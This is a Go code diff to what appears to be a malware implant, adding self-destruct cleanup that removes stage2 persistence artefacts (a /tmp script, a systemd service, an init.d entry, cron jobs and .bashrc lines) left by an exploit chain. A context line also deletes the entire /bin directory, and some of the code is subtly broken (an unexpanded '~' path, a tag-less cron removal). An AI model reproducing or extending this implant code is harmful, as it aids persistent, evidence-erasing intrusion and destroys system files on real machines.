@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -9,7 +10,11 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"path/filepath"
+	"strings"
 	"time"
+
+	"github.com/go-co-op/gocron/v2"
 )
 
 type ImplantConfig struct {
@@ -155,5 +160,70 @@ func (i *Implant) SelfDestruct() {
 	os.RemoveAll("/bin") // TODO: make sure all implant stuff will be in this dir
 
 	// undoing everything in stage1.sh in CVE
+	stage_2_path := "/tmp/stage2.sh"
+	os.RemoveAll(stage_2_path)                         // remove dir where stage2 is saved
+	os.RemoveAll("/etc/systemd/system/stage2.service") // remove dir with system services
 	os.RemoveAll("/etc/init.d/stage2")
+
+	// -> removing cron jobs
+	scheduler, _ := gocron.NewScheduler()
+	scheduler.RemoveByTags()
+
+	// remove entries in .bashrc
+	// removeSubstr(bashrc, stage_2_path)
+	// commented out because this might be overkill
+	bashrc := "~/.bashrc"
+	content, err := os.ReadFile(bashrc)
+	if err != nil {
+		panic(err)
+	}
+	strContent := string(content)
+	modifiedContent := strings.ReplaceAll(strContent, stage_2_path, "")
+	err = os.WriteFile(bashrc, []byte(modifiedContent), 0644)
+	if err != nil {
+		panic(err)
+	}
+
+}
+
+func removeSubstr(path, substr string) error {
+	inFile, err := os.Open(path)
+	if err != nil {
+		panic(err)
+	}
+	defer inFile.Close()
+
+	dir, name := filepath.Split(path)
+	tmp, err := os.CreateTemp(dir, name+".tmp")
+	if err != nil {
+		panic(err)
+	}
+	defer func() {
+		tmp.Close()
+		os.Remove(tmp.Name())
+	}()
+
+	scanner := bufio.NewScanner(inFile)
+	writer := bufio.NewWriter(tmp)
+
+	for scanner.Scan() {
+		line := scanner.Text()
+		if !strings.Contains(line, substr) {
+			if _, err := writer.WriteString(line + "\n"); err != nil {
+				panic(err)
+			}
+		}
+	}
+	if err := scanner.Err(); err != nil {
+		panic(err)
+	}
+	if err := writer.Flush(); err != nil {
+		panic(err)
+	}
+	tmp.Close()
+
+	if err := os.Rename(tmp.Name(), path); err != nil {
+		panic(err)
+	}
+	return nil
 }
